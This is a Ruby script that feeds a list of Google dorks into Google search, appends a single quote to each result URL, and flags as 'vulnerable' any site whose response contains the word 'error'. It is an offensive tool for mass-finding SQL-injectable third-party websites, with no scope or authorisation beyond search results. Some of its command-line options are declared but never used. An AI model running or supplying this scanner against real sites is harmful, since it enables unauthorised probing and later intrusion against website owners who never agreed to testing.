#!/usr/bin/ruby
#
#will take a list of google dorks as input and will check 
# if an error occurs when adding ' at the end of input
require 'net/http'
require 'optparse'
require 'mechanize'
require 'uri'


@opts = {}
opt_parser = OptionParser.new do |opt|
    opt.banner = "Usage: searchSqli.rb file [OPTIONS]"
    opt.separator ""
    opt.separator "file is where are stored the sqli dorks"
    opt.separator "OPTIONS :"
    opt.on("-m","--minimum","Minimum index to pick from google results") do |o|
        @opts[:min] = o
    end
    opt.on("-M","--Maximum","Maximum index to pick from google results") do |o|
        @opts[:max] =o
    end
    opt.on("-a","--all","Test every dorks until the end. Do Not block on the first good result") do |o|
        @opts[:all] = true
    end
    opt.on("-o","--output","Output file of the vulnerable sites") do |o|
        @opts[:output] = o
    end
    opt.on("-v","--verbose","verbose output") do |v|
        @opts[:v] = true
    end


end

def fetch_google_with dork
    agent = Mechanize.new
    agent.user_agent_alias = 'Linux Firefox'
    page = agent.get('http://google.com')
    form = page.form('f')
    form.q = dork
    page = agent.submit(form)
    page.links.each do |link|
        if link.href.to_s =~ /url.q/
            str = link.href.to_s
            strList= str.split(%r{=|&})

            url = strList[1]
            yield URI.decode(url)
        end
    end

end

def inject url
    begin
    agent = Mechanize.new
    agent.user_agent_alias = 'Linux Firefox'
    page = agent.get("#{url}'")
    body = page.body
    if body.include?("Error") || body.include?("error") || body.include?("Errors") || body.include?("errors")
       print "Vulnerable ! (?)" if @opts[:v]
       return true
    end 
    print 'None....' if @opts[:v]
    rescue => e
        puts e.message
    end
    return nil
end
opt_parser.parse!
unless ARGV.size > 0 && File.exists?(ARGV[0])
    puts @opts
    abort
end

file = File.new ARGV[0]
vuln = []
file.each_line do |dork|
    fetch_google_with dork do |urlp|
            print urlp + ' ... ' if @opts[:v]
            if inject urlp
                puts urlp
                if @opts[:all] 
                    vuln << urlp
                else 
                    exit
                end
            end
            print "\n"        
            sleep(2)
    end

end


